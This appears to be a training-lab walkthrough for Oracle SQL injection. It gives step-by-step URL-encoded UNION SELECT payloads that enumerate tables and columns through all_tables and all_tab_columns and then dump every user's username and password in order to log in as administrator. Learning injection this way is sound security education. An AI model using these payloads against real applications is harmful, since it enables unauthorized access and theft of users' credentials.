[+] Lab: SQL injection attack, listing the database contents on Oracle

[+] Our goal is to obtain the username and password of all users and log in as the administrator user. 

[+] SQL Sample: UNION SELECT 'abc' FROM dual

[+] 1. Check that the query is returning two columns, both of which contain text:
'+UNION+SELECT+'abc','def'+FROM+dual--

[+] 2.  Use this payload to retrieve the list of tables in the database: 
'+UNION+SELECT+table_name,NULL+FROM+all_tables--

[+] 3. Look for the table that contains user credentials
[-] Users Table: USERS_NTXKDC

[+] 4.  Use this payload (replace the table name) to retrieve the details of the columns in the table:
 '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_NTXKDC'--
 
 [+] 5. Look for username and password
 [-] USERNAME_YZBDWQ
 [-] PASSWORD_JNQCWS
 
 [+] 6.  Use this payload (replace both username & password) to retrieve the usernames and passwords for all users: 
 '+UNION+SELECT+USERNAME_YZBDWQ,+PASSWORD_JNQCWS+FROM+USERS_NTXKDC--
